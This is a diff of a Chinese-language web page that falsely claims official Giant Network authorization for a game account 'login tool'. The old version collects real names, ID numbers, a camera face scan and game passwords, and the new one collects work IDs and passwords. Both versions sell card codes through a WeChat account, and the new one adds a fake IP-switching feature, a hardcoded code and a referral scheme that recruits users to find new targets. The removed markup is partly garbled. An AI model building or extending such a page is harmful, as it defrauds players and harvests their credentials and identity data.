@@ -1,742 +1,759 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>巨人网络官方</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
-        }
-        body {
-            background: linear-gradient(135deg, #0a0a1a 0%, #1a3a3a 100%);
-            color: #e0e0ff;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .auth-page {
-            width: 100%;
-            max-width: 500px;
-            background: rgba(15, 15, 35, 0.95);
-            border-radius: 16px;
-            border: 2px solid #4a4a8c;
-            padding: 40px 30px;
-            box-shadow: 0 12px 40px rgba(0,0,0,0.7);
-            text-align: center;
-        }
-        .auth-title {
-            font-size: 26px;
-            color: #fff;
-            margin-bottom: 10px;
-        }
-        .auth-sub {
-            color: #b0b0ff;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-        .auth-input {
-            width: 100%;
-            padding: 16px 20px;
-            background: rgba(30,30,60,0.8);
-            border: 2px solid #4a4a8c;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-        .auth-input:focus {
-            outline: none;
-            border-color: #8a5aee;
-        }
-        .auth-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(to right, #5a2aae, #8a5aee);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .auth-btn:hover {
-            background: linear-gradient(to right, #6a3abe, #9a6afe);
-        }
-
-        .face-page {
-            width: 100%;
-            max-width: 500px;
-            background: rgba(15,15,35,0.95);
-            border-radius: 16px;
-            border: 2px solid #4a4a8c;
-            padding: 30px;
-            text-align: center;
-            display: none;
-        }
-        .face-title {
-            font-size: 24px;
-            color: #fff;
-            margin-bottom: 20px;
-        }
-        .face-tip {
-            color: #c0c0ff;
-            margin-bottom: 20px;
-            font-size: 15px;
-            min-height: 20px;
-        }
-        video {
-            width: 100%;
-            height: 350px;
-            background: #000;
-            border-radius: 12px;
-            object-fit: cover;
-            margin-bottom: 20px;
-            border: 3px solid #8a5aee;
-        }
-        .face-result {
-            font-size: 18px;
-            color: #fff;
-            margin-top: 15px;
-            height: 30px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 500px;
-            background: rgba(15, 15, 35, 0.95);
-            border-radius: 16px;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.7);
-            border: 2px solid #4a4a8c;
-            overflow: hidden;
-            backdrop-filter: blur(10px);
-            display: none;
-        }
-        .header {
-            background: linear-gradient(to right, #2a0a5e, #6a3ace);
-            padding: 30px 20px;
-            text-align: center;
-            border-bottom: 4px solid #8a5aee;
-            position: relative;
-            overflow: hidden;
-        }
-        .header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(138, 90, 238, 0.2) 0%, transparent 70%);
-            animation: pulse 6s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 0.3; }
-            50% { transform: scale(1.1); opacity: 0.5; }
-        }
-        .title {
-            font-size: 32px;
-            font-weight: 800;
-            color: #ffffff;
-            text-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-            position: relative;
-            z-index: 1;
-        }
-        .subtitle {
-            font-size: 16px;
-            color: #b0b0ff;
-            margin-top: 5px;
-            position: relative;
-            z-index: 1;
-        }
-        .official-badge {
-            display: inline-block;
-            background: linear-gradient(45deg, #ff5500, #ffaa00);
-            color: #fff;
-            font-size: 14px;
-            padding: 6px 20px;
-            border-radius: 25px;
-            margin-top: 15px;
-            font-weight: bold;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 12px rgba(255, 85, 0, 0.3);
-            position: relative;
-            z-index: 1;
-        }
-        .login-form {
-            padding: 35px 30px;
-        }
-        .form-group {
-            margin-bottom: 25px;
-        }
-        .form-label {
-            display: block;
-            margin-bottom: 10px;
-            font-size: 16px;
-            color: #c0c0ff;
-            font-weight: 500;
-        }
-        .form-input {
-            width: 100%;
-            padding: 16px 20px;
-            background: rgba(30, 30, 60, 0.8);
-            border: 2px solid #4a4a8c;
-            border-radius: 10px;
-            color: #ffffff;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-        .form-input:focus {
-            outline: none;
-            border-color: #8a5aee;
-            box-shadow: 0 0 0 3px rgba(138, 90, 238, 0.3);
-            background: rgba(40, 40, 80, 0.9);
-        }
-        .version-group {
-            margin: 30px 0;
-            padding: 20px;
-            background: rgba(30, 30, 60, 0.5);
-            border: 2px solid #4a4a8c;
-            border-radius: 10px;
-        }
-        .version-title {
-            font-size: 16px;
-            color: #c0c0ff;
-            font-weight: 500;
-            margin-bottom: 15px;
-        }
-        .version-item {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-            cursor: pointer;
-        }
-        .version-item input {
-            width: 20px;
-            height: 20px;
-            margin-right: 10px;
-            accent-color: #8a5aee;
-        }
-        .version-item label {
-            font-size: 16px;
-            color: #e0e0ff;
-            cursor: pointer;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(to right, #5a2aae, #8a5aee);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            position: relative;
-            overflow: hidden;
-        }
-        .login-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
-        }
-        .login-btn:hover {
-            background: linear-gradient(to right, #6a3abe, #9a6afe);
-            box-shadow: 0 8px 25px rgba(138, 90, 238, 0.5);
-            transform: translateY(-2px);
-        }
-        .login-btn:hover::before {
-            left: 100%;
-        }
-        .login-btn:active {
-            transform: translateY(0);
-            box-shadow: 0 4px 15px rgba(138, 90, 238, 0.3);
-        }
-        .status-container {
-            margin-top: 30px;
-            border-top: 1px solid #3a3a6a;
-            padding-top: 25px;
-        }
-        .status-title {
-            font-size: 18px;
-            color: #b0b0ff;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .status-title::before {
-            content: "🚀";
-            font-size: 20px;
-        }
-        .status-output {
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid #3a3a6a;
-            border-radius: 10px;
-            padding: 20px;
-            height: 180px;
-            overflow-y: auto;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 14px;
-            color: #a0e0a0;
-            line-height: 1.6;
-        }
-        .status-entry {
-            margin-bottom: 10px;
-            padding-left: 12px;
-            border-left: 3px solid #8a5aee;
-        }
-        .status-time {
-            color: #a0a0ff;
-            font-size: 13px;
-        }
-        .jump-link {
-            color: #ffaa00;
-            font-weight: bold;
-            cursor: pointer;
-            text-decoration: underline;
-            user-select: none;
-        }
-        .jump-link:hover {
-            color: #ffcc33;
-        }
-        .red-text {
-            color: #ff4444 !important;
-            font-weight: bold !important;
-        }
-        .game-info {
-            background: rgba(42, 10, 94, 0.3);
-            border: 1px solid #5a2aae;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 25px;
-            font-size: 14px;
-            color: #c0c0ff;
-        }
-        .game-info-title {
-            color: #8a5aee;
-            font-weight: bold;
-            margin-bottom: 8px;
-            font-size: 16px;
-        }
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 13px;
-            color: #8080c0;
-            border-top: 1px solid #3a3a6a;
-            background: rgba(10, 10, 30, 0.8);
-        }
-        .hint {
-            font-size: 13px;
-            color: #a0a0d0;
-            margin-top: 10px;
-            text-align: center;
-            font-style: italic;
-        }
-        .loading {
-            display: none;
-            text-align: center;
-            margin: 20px 0;
-        }
-        .loader {
-            display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(138, 90, 238, 0.3);
-            border-radius: 50%;
-            border-top-color: #8a5aee;
-            animation: spin 1s ease-in-out infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .card-code-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .modal-content {
-            width: 100%;
-            max-width: 450px;
-            background: rgba(15, 15, 35, 0.98);
-            border: 2px solid #8a5aee;
-            border-radius: 16px;
-            padding: 40px 30px;
-            text-align: center;
-        }
-        .modal-title {
-            font-size: 28px;
-            color: #ffffff;
-            margin-bottom: 15px;
-            font-weight: 700;
-        }
-        .modal-buy {
-            background: rgba(255, 170, 0, 0.1);
-            border: 1px solid #ffaa00;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: left;
-            color: #f0e0b0;
-        }
-        .modal-buy-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #ffaa00;
-            margin-bottom: 8px;
-        }
-        .modal-buy p {
-            font-size: 14px;
-            line-height: 1.6;
-            margin: 5px 0;
-        }
-        .modal-refund {
-            background: rgba(0, 170, 255, 0.1);
-            border: 1px solid #00aaff;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: left;
-            color: #b0e0f0;
-        }
-        .modal-refund-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #00aaff;
-            margin-bottom: 8px;
-        }
-        .modal-refund p {
-            font-size: 14px;
-            line-height: 1.6;
-            margin: 5px 0;
-        }
-        .modal-input {
-            width: 100%;
-            padding: 18px 20px;
-            margin: 10px 0;
-            background: rgba(30, 30, 60, 0.8);
-            border: 2px solid #4a4a8c;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 18px;
-            text-align: center;
-        }
-        .modal-input:focus {
-            outline: none;
-            border-color: #8a5aee;
-            box-shadow: 0 0 0 3px rgba(138, 90, 238, 0.3);
-        }
-        .modal-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(to right, #5a2aae, #8a5aee);
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-        .modal-btn:hover {
-            background: linear-gradient(to right, #6a3abe, #9a6afe);
-            box-shadow: 0 4px 15px rgba(138, 90, 238, 0.5);
-        }
-        .modal-error {
-            color: #ff5555;
-            font-size: 14px;
-            margin-top: 10px;
-            display: none;
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>超自然行动上号器 - 官方认证</title>
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:"Segoe UI","Microsoft YaHei","sans-serif";
+}
+body{
+  background:#f4f9ff;
+  color:#1f2337;
+  padding:20px;
+}
+.container{
+  max-width:400px;
+  margin:0 auto;
+  background:#fff;
+  border-radius:20px;
+  padding:35px 30px;
+  box-shadow:0 12px 32px rgba(34,80,160,0.08);
+  border:1px solid rgba(59,130,246,0.1);
+}
+.title{
+  font-size:26px;
+  font-weight:700;
+  text-align:center;
+  color:#1e40af;
+  margin-bottom:8px;
+}
+.auth-badge{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  font-size:14px;
+  margin-bottom:6px;
+}
+.enterprise-tag{
+  background:#2563eb;
+  color:#fff;
+  padding:3px 10px;
+  border-radius:6px;
+  font-size:12px;
+  font-weight:500;
+}
+.server-name{
+  text-align:center;
+  font-size:15px;
+  color:#4b5568;
+  margin-bottom:30px;
+  font-weight:500;
+}
+.form-item{
+  margin-bottom:22px;
+  position:relative; /* 相对定位，用于按钮绝对定位 */
+}
+.form-item label{
+  display:block;
+  margin-bottom:8px;
+  font-size:14px;
+  font-weight:500;
+}
+.form-item input{
+  width:100%;
+  height:48px;
+  padding:0 18px;
+  border:1px solid #dbeafe;
+  border-radius:12px;
+  background:#fbfdff;
+  font-size:15px;
+  outline:none;
+}
+.form-item input:focus{
+  border-color:#3b82f6;
+  box-shadow:0 0 0 4px rgba(59,130,246,0.1);
+}
+/* 推广福利按钮 */
+.promote-btn{
+  position:absolute;
+  right:10px;
+  top:32px;
+  padding:4px 10px;
+  background:#f97316;
+  color:#fff;
+  border:none;
+  border-radius:6px;
+  font-size:12px;
+  cursor:pointer;
+  font-weight:500;
+}
+.next-btn{
+  width:100%;
+  height:50px;
+  background:#2563eb;
+  color:#fff;
+  border:none;
+  border-radius:12px;
+  font-size:16px;
+  font-weight:500;
+  cursor:pointer;
+}
+.loading-modal{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:rgba(0,0,0,0.5);
+  display:none;
+  align-items:center;justify-content:center;
+  z-index:9999;
+}
+.loading-box{
+  background:#fff;
+  width:340px;
+  border-radius:16px;
+  padding:28px;
+  text-align:center;
+}
+.loading-text{
+  font-size:15px;
+  color:#1e40af;
+  margin-bottom:15px;
+  line-height:1.6;
+  text-align:center;
+}
+.prov-tip-red{
+  font-size:18px;
+  font-weight:bold;
+  color:#ff0000;
+  margin:10px 0;
+}
+.loading-bar{
+  width:100%;
+  height:6px;
+  background:#e6f0ff;
+  border-radius:3px;
+  overflow:hidden;
+  margin-bottom:20px;
+}
+.loading-progress{
+  height:100%;
+  width:0%;
+  background:#2563eb;
+  transition:width 0.3s;
+}
+.notice-list{
+  font-size:13px;
+  color:#374151;
+  line-height:1.8;
+  margin-bottom:15px;
+  padding-left:10px;
+  text-align:left;
+}
+.notice-list li{
+  margin-bottom:6px;
+  list-style-position:inside;
+}
+.price-tip{
+  font-size:15px;
+  color:#ef4444;
+  font-weight:600;
+  text-align:center;
+  margin-bottom:18px;
+}
+.agree-row{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  margin-bottom:15px;
+  font-size:14px;
+  justify-content:center;
+}
+.price-btn{
+  width:100%;
+  height:44px;
+  background:#2563eb;
+  color:#fff;
+  border:none;
+  border-radius:10px;
+  font-size:15px;
+  cursor:pointer;
+}
+.price-btn:disabled{
+  background:#cbd5e1;
+  cursor:not-allowed;
+}
+/* 关闭按钮 */
+.close-btn{
+  margin-top:10px;
+  padding:8px 16px;
+  background:#ccc;
+  border:none;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:14px;
+}
+.ip-group{
+  margin-top:25px;
+}
+.ip-header{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  margin-bottom:8px;
+}
+.ip-header label{
+  font-size:14px;
+  font-weight:500;
+}
+.ip-desc{
+  font-size:13px;
+  color:#2563eb;
+  text-decoration:underline;
+  cursor:pointer;
+}
+select{
+  width:100%;
+  height:48px;
+  padding:0 15px;
+  border:1px solid #dbeafe;
+  border-radius:12px;
+  background:#fbfdff;
+  font-size:15px;
+  margin-bottom:15px;
+}
+.ip-btn{
+  width:100%;
+  height:48px;
+  background:#0ea5e9;
+  color:#fff;
+  border:none;
+  border-radius:12px;
+  font-size:16px;
+  font-weight:500;
+  cursor:pointer;
+  margin-bottom:12px;
+}
+.ip-tip-bar{
+  width:100%;
+  background:#0b122b;
+  color:#fff;
+  padding:12px 18px;
+  border-radius:10px;
+  font-size:14px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  box-shadow:0 0 20px rgba(59,130,246,0.4);
+  border:1px solid #3b82f6;
+  display:none;
+}
+.ip-tip-bar .area{
+  color:#3b82f6;
+  font-weight:bold;
+}
+.ip-tip-bar .time{
+  color:#10b981;
+  font-family:monospace;
+  font-size:14px;
+}
+.card-modal{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:rgba(0,0,0,0.5);
+  display:none;
+  align-items:center;justify-content:center;
+  z-index:10000;
+}
+.card-box{
+  background:#fff;
+  width:320px;
+  border-radius:16px;
+  padding:28px;
+  text-align:center;
+}
+.card-title{
+  font-size:17px;
+  font-weight:600;
+  margin-bottom:18px;
+  color:#1e40af;
+}
+.card-input{
+  width:100%;
+  height:46px;
+  border:1px solid #dbeafe;
+  border-radius:12px;
+  padding:0 16px;
+  font-size:15px;
+  margin-bottom:18px;
+  text-align:center;
+}
+.card-btn{
+  width:100%;
+  height:44px;
+  background:#2563eb;
+  color:#fff;
+  border:none;
+  border-radius:10px;
+  font-size:15px;
+  cursor:pointer;
+}
+.help-text{
+  margin-top:14px;
+  font-size:13px;
+  color:#6b7280;
+}
+.help-link{
+  color:#2563eb;
+  text-decoration:underline;
+  cursor:pointer;
+}
+.success-modal{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:rgba(0,0,0,0.5);
+  display:none;
+  align-items:center;justify-content:center;
+  z-index:10001;
+}
+.success-box{
+  background:#fff;
+  width:300px;
+  border-radius:16px;
+  padding:30px;
+  text-align:center;
+}
+.success-msg{
+  font-size:16px;
+  color:#111827;
+  line-height:1.6;
+  margin-bottom:20px;
+}
+.success-close{
+  width:100%;
+  height:42px;
+  background:#10b981;
+  color:#fff;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+}
+.bottom-info{
+  margin-top:35px;
+  padding-top:20px;
+  border-top:1px solid #e6f0ff;
+  text-align:center;
+  font-size:12px;
+  color:#6b7280;
+  line-height:1.6;
+}
+.promise{
+  color:#1e40af;
+  font-weight:500;
+  margin-bottom:5px;
+}
+.copyright{
+  color:#9ca3af;
+}
+.float-mask{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:rgba(0,0,0,0.25);
+  display:none;
+  align-items:center;justify-content:center;
+  z-index:999;
+}
+.float-box{
+  background:#fff;
+  width:320px;
+  border-radius:16px;
+  padding:25px;
+}
+.float-box h4{
+  font-size:16px;
+  margin-bottom:12px;
+}
+.float-box p{
+  font-size:14px;
+  line-height:1.6;
+  margin-bottom:8px;
+}
+.float-close{
+  margin-top:18px;
+  width:100%;
+  height:38px;
+  background:#e0e7ff;
+  color:#1e40af;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+}
+/* 推广福利悬浮窗 */
+.promote-modal{
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:rgba(0,0,0,0.5);
+  display:none;
+  align-items:center;justify-content:center;
+  z-index:10002; /* 层级高于其他弹窗 */
+}
+.promote-box{
+  background:#fff;
+  width:320px;
+  border-radius:16px;
+  padding:25px;
+  text-align:left;
+}
+.promote-title{
+  font-size:18px;
+  font-weight:600;
+  color:#f97316;
+  margin-bottom:15px;
+  text-align:center;
+}
+.promote-desc{
+  font-size:14px;
+  color:#374151;
+  line-height:1.8;
+  margin-bottom:15px;
+}
+.promote-desc strong{
+  color:#1e40af;
+}
+.promote-rule{
+  margin-bottom:12px;
+}
+.promote-rule h5{
+  font-size:15px;
+  color:#2563eb;
+  margin-bottom:8px;
+}
+.promote-rule ul{
+  padding-left:20px;
+  font-size:13px;
+  color:#4b5568;
+  line-height:1.7;
+}
+.promote-note{
+  font-size:13px;
+  color:#ef4444;
+  line-height:1.6;
+  margin-top:15px;
+  padding:8px;
+  background:#fef2f2;
+  border-radius:6px;
+}
+.promote-close{
+  margin-top:20px;
+  width:100%;
+  height:38px;
+  background:#f97316;
+  color:#fff;
+  border:none;
+  border-radius:8px;
+  cursor:pointer;
+  font-weight:500;
+}
+</style>
 </head>
-
 <body>
-
-<div class="auth-page" id="authPage">
-    <h2 class="auth-title">超自然巨人网络官方认证</h2>
-    <p class="auth-sub">姓名:李文 号码:546387952468754975</p>
-    <input class="auth-input" id="realname" placeholder="请输入姓名" />
-    <input class="auth-input" id="idcard" placeholder="请输入身份证号" />
-    <button class="auth-btn" id="goFace">下一步</button>
+<div class="container">
+  <div class="title">超自然行动上号器</div>
+  <div class="auth-badge">
+    <span class="enterprise-tag">企业认证</span>
+    <span>巨人网络专业授权</span>
+  </div>
+  <div class="server-name">仔仔网游 — 手游账号服务中心</div>
+  <div class="form-item">
+    <label>请输入工号</label>
+    <input type="text" placeholder="请输入工号" id="workId">
+    <!-- 推广福利按钮 -->
+    <button class="promote-btn" onclick="showPromoteModal()">推广福利</button>
+  </div>
+  <div class="form-item">
+    <label>请输入密码</label>
+    <input type="password" placeholder="请输入密码" id="pwd">
+  </div>
+  <button class="next-btn" onclick="startAutoVerify()">下一步</button>
+  <div class="ip-group">
+    <div class="ip-header">
+      <label>请选择 IP 地址</label>
+      <span class="ip-desc" onclick="showFloat()">了解详情</span>
+    </div>
+    <select id="province">
+      <option value="">-- 请选择省份 --</option>
+      <option>北京</option>
+      <option>天津</option>
+      <option>河北</option>
+      <option>山西</option>
+      <option>内蒙古</option>
+      <option>辽宁</option>
+      <option>吉林</option>
+      <option>黑龙江</option>
+      <option>上海</option>
+      <option>江苏</option>
+      <option>浙江</option>
+      <option>安徽</option>
+      <option>福建</option>
+      <option>江西</option>
+      <option>山东</option>
+      <option>河南</option>
+      <option>湖北</option>
+      <option>湖南</option>
+      <option>广东</option>
+      <option>广西</option>
+      <option>海南</option>
+      <option>重庆</option>
+      <option>四川</option>
+      <option>贵州</option>
+      <option>云南</option>
+      <option>西藏</option>
+      <option>陕西</option>
+      <option>甘肃</option>
+      <option>青海</option>
+      <option>宁夏</option>
+      <option>新疆</option>
+    </select>
+    <button class="ip-btn" onclick="doChangeIp()">立即修改 IP</button>
+    <div class="ip-tip-bar" id="ipTipBar">
+      <div>已成功切换至：<span class="area" id="ipArea">-</span></div>
+      <div class="time" id="timer">00:00</div>
+    </div>
+  </div>
+  <div class="bottom-info">
+    <div class="promise">官方承诺：安全稳定 不封禁 不盗号</div>
+    <div class="copyright">© 2025-2026 仔仔网游版权所有</div>
+  </div>
 </div>
 
-<div class="face-page" id="facePage">
-    <h2 class="face-title">人脸识别中</h2>
-    <p class="face-tip" id="faceTip">正在打开摄像头...</p>
-    <video id="video" autoplay muted playsinline></video>
-    <div class="face-result" id="faceResult">正在初始化...</div>
+<!-- 推广福利悬浮窗 -->
+<div class="promote-modal" id="promoteModal">
+  <div class="promote-box">
+    <div class="promote-title">推广福利活动</div>
+    <div class="promote-desc">
+      无门槛、无要求，仔仔网游邀请你一起领福利
+    </div>
+    <div class="promote-rule">
+      <h5>一、推广说明</h5>
+      <ul>
+        <li>1. 在短视频平台搜索「超自然帮找回」作品，找到潜在好友并向其推荐本机构服务；</li>
+        <li>2. 推广参考："打开微信公众号搜索「仔仔网游」，联系客服即可办帮找回账号"</li>
+      </ul>
+    </div>
+    <div class="promote-rule">
+      <h5>二、推广福利（二选一）</h5>
+      <ul>
+        <li><strong>模式一</strong>：成功推广1人，返现🧧7.77元 + 赠送上号器永久卡1张；</li>
+        <li><strong>模式二</strong>：成功推广1人，免费享受1次账号找回服务（全程免费，不收任何费用）。</li>
+      </ul>
+    </div>
+    <div class="promote-note">
+      注意事项：推广人必须确保被推广人在本机构完成下单，才算推广成功；推广成功后需保留相关凭证截图，联系客服即可结算福利。
+    </div>
+    <button class="promote-close" onclick="closePromoteModal()">我知道了</button>
+  </div>
 </div>
 
-<div class="container" id="mainContainer">
-    <div class="header">
-        <h1 class="title">超自然行动组</h1>
-        <div class="subtitle">专用登录启动器</div>
-        <div class="official-badge">超自然巨人网络专业授权</div>
+<div class="loading-modal" id="loadingModal">
+  <div class="loading-box">
+    <div class="loading-text" id="loadText">正在初始化环境...</div>
+    <div class="prov-tip-red" id="provTip" style="display:none;"></div>
+    <div class="loading-bar">
+      <div class="loading-progress" id="loadProgress"></div>
     </div>
-    <div class="login-form">
-        <div class="game-info">
-            <div class="game-info-title">游戏信息</div>
-            <div>游戏名称：超自然行动组</div>
-            <div>版本：V2.5.1</div>
-            <div>安装位置：本地默认路径</div>
-        </div>
-        <div class="form-group">
-            <label class="form-label" for="username">请输入工号</label>
-            <input type="text" id="username" class="form-input" placeholder="输入您的游戏账号">
-        </div>
-        <div class="form-group">
-            <label class="form-label" for="password">请输入密码</label>
-            <input type="password" id="password" class="form-input" placeholder="输入您的密码">
-        </div>
-        <div class="version-group {
-            margin: 30px 0;
-            padding: 20px;
-            background: rgba(30, 30, 60, 0.5);
-            border: 2px solid #4a4a8c;
-            border-radius: 10px;
-        }
-        .version-title {
-            font-size: 16px;
-            color: #c0c0ff;
-            font-weight: 500;
-            margin-bottom: 15px;
-        }
-        .version-item {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-            cursor: pointer;
-        }
-        .version-item input {
-            width: 20px;
-            height: 20px;
-            margin-right: 10px;
-            accent-color: #8a5aee;
-        }
-        .version-item label {
-            font-size: 16px;
-            color: #e0e0ff;
-            cursor: pointer;
-        }
-        <div class="loading" id="loading">
-            <div class="loader"></div>
-            <div style="margin-top: 10px; color: #8a5aee;">正在验证信息...</div>
-        </div>
-        <button id="login-btn" class="login-btn">确认登录并启动游戏</button>
-        <div class="hint">若没有打开，请手动打开超自然行动组</div>
-        <div class="status-container">
-            <div class="status-title">系统状态</div>
-            <div id="status-output" class="status-output"></div>
-        </div>
+    <ul class="notice-list" id="noticeList" style="display:none;">
+      <li>登录账号后，请妥善保管账号信息，切勿随意出借、出售给他人</li>
+      <li>使用本上号器期间，请勿随意中断应用、切后台或锁屏，避免上号失败</li>
+      <li>本上号器为专属授权通道，仅支持本人使用，禁止多设备同时登录</li>
+      <li>使用过程中若出现异常，请先检查网络及IP地址是否为选定归属地</li>
+      <li>请勿使用第三方插件、模拟器辅助登录，否则将触发游戏风控封禁</li>
+    </ul>
+    <div class="price-tip" id="priceTip" style="display:none;">上号器授权费用：¥50.00（永久使用）</div>
+    <div class="agree-row" id="agreeRow" style="display:none;">
+      <input type="checkbox" id="agreeCheck2" onchange="checkPriceAgree()">
+      <label for="agreeCheck2">我已阅读并同意以上所有注意事项及费用说明</label>
     </div>
-    <div class="footer">
-        超自然巨人网络 © 2026 · 专业授权版本 V3.0.1
-    </div>
+    <button class="price-btn" id="priceBtn" style="display:none;" disabled onclick="showCardModal()">立即上号</button>
+    <!-- 关闭按钮 -->
+    <button class="close-btn" id="closeTipBtn" style="display:none;" onclick="closeProvinceTip()">关闭</button>
+  </div>
 </div>
 
-<div class="card-code-modal" id="cardCodeModal">
-    <div class="modal-content">
-        <h2 class="modal-title">卡密验证</h2>
-        <p style="margin-bottom: 5px;">验证通过后方可继续启动游戏</p>
-        <div class="modal-buy">
-            <div class="modal-buy-title">📌 卡密购买渠道</div>
-            <p>1. 购买方式：微信公众号<b>搜索: 仔仔网游</b>，联系专属客服购买</p>
-            <p>2. 卡密费用：<b>25元/永久卡</b>，一次购买终身使用</p>
-            <p>3. 卡密类型：专属唯一卡密，仅本人账号可使用</p>
-        </div>
-        <div class="modal-refund">
-            <div class="modal-refund-title">⚖️ 权威仅退款证明说明</div>
-            <p>1. 本卡密为虚拟数字商品，一经出售<b>概不支持仅退款</b>，无实体发货凭证</p>
-            <p>2. 若卡密存在失效/无法使用问题，需提供<b>完整使用截图证明</b>，核实后免费补发</p>
-            <p>3. 非卡密本身问题（如账号错误、设备不兼容），不予处理退款/补发申请</p>
-            <p>4. 本说明受相关法律法规保护，为官方授权上号器</p>
-        </div>
-        <input type="text" class="modal-input" id="cardCodeInput" placeholder="请输入购买的永久卡密">
-        <div class="modal-error" id="modalError">卡密错误，请核对后重新输入！</div>
-        <button class="modal-btn" id="cardCodeBtn">验证卡密并继续</button>
+<div class="card-modal" id="cardModal">
+  <div class="card-box">
+    <div class="card-title">请输入缴费后获取的卡密</div>
+    <input type="text" class="card-input" id="cardInput" placeholder="请输入卡密，不能为空">
+    <button class="card-btn" onclick="checkCard()">确定</button>
+    <div class="help-text">
+      还未获取卡密？<span class="help-link" onclick="goToPay()">点击前往缴费</span>
     </div>
+  </div>
+</div>
+
+<div class="success-modal" id="successModal">
+  <div class="success-box">
+    <div class="success-msg">登录成功<br>祝您游戏愉快！</div>
+    <button class="success-close" onclick="closeSuccess()">确定</button>
+  </div>
+</div>
+
+<div class="float-mask" id="floatMask">
+  <div class="float-box">
+    <h4>为什么要切换 IP 地址？</h4>
+    <p>1、游戏内有严格安全检测，跨省/跨地区登录会触发风控，可能导致账号限制、封禁。</p>
+    <p>2、为保证账号稳定上号，必须切换到账号常用归属地 IP，才能正常登录游戏。</p>
+    <p>3、请选择账号注册地或常用登录地，避免系统异常检测。</p>
+    <button class="float-close" onclick="closeFloat()">我知道了</button>
+  </div>
 </div>
 
 <script>
-    const authPage = document.getElementById('authPage');
-    const facePage = document.getElementById('facePage');
-    const mainContainer = document.getElementById('mainContainer');
-    const goFace = document.getElementById('goFace');
-    const realname = document.getElementById('realname');
-    const idcard = document.getElementById('idcard');
-    const video = document.getElementById('video');
-    const faceTip = document.getElementById('faceTip');
-    const faceResult = document.getElementById('faceResult');
+let timerInterval = null;
+let seconds = 0;
+// 固定卡密：yynbww
+const CORRECT_CARD = "yynbww";
+const allProvinces = [
+  "北京","天津","河北","山西","内蒙古","辽宁","吉林","黑龙江",
+  "上海","江苏","浙江","安徽","福建","江西","山东","河南",
+  "湖北","湖南","广东","广西","海南","重庆","四川","贵州",
+  "云南","西藏","陕西","甘肃","青海","宁夏","新疆"
+];
 
-    goFace.onclick = () => {
-        const name = realname.value.trim();
-        const id = idcard.value.trim();
-        if (!name) {
-            alert('请输入姓名');
-            return;
-        }
-        if (id.length !== 18) {
-            alert('身份证号必须为18位');
-            return;
-        }
-        authPage.style.display = 'none';
-        facePage.style.display = 'block';
-        startFace();
-    };
+// 推广福利弹窗控制
